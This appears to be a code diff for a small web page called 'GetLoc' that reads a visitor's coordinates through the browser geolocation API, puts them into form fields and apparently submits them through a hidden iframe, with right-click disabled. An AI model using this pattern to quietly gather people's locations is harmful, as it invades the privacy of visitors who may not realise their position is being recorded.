@@ -1,7 +1,8 @@
 <!DOCTYPE html><html oncontextmenu="return false" lang="en" dir="ltr"><head><meta charset="utf-8"><title>GetLoc</title>
 <link rel="shortcut icon" type="image" href="https://nishandangi.com.np/nsd.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
-<script>function getloc(){navigator.geolocation.getCurrentPosition(position=>{var a= position.coords.latitude;var  b=position.coords.longitude;document.getElementById('abc').value = a;document.getElementById('abcc').value = b; }  )};</script>
+<script>function getloc(){navigator.geolocation.getCurrentPosition(position=>{var a= position.coords.latitude;var  b=position.coords.longitude; var c= a +","+b;
+ document.getElementById('abc').value = c; document.getElementById('abcc').value = c; }  )};</script>
 <style>#ss{padding:40px;border-radius:30px;color:#fff;background:purple;text-transform:uppercase;}#ss:hover{background:red;}.cc{position:absolute;right:50%;left:50%,top:50%;transform:translate(50%,50%)</style>
 </head><body> <script type="text/javascript">var submitted=false;</script>
  <iframe name="hidden_iframe" id="hidden_iframe" style="display: none" onload="if(submitted){ window.location='https://nishandangi.com.np/getloc';}"></iframe>
